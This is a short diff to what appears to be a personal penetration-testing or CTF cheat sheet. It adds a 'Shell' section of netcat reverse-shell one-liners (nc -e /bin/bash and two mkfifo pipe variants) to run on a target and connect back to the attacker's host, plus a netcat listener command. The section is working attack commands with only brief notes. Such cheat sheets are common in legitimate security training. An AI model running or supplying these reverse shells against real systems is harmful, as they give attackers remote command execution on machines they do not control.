@@ -57,6 +57,18 @@
 - -d = debug
 - -vv = verbpse
 
+## Shell
+- Reverse:
+  - target: 
+    - nc <LOCAL-IP> <PORT> -e /bin/bash
+    - mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LOCAL-IP> <PORT> >/tmp/f”
+
+
+
+  - Ziel: nc -nlvp PORT
+
+
 
 # Getting file into target
 - Option 1 - starting local server
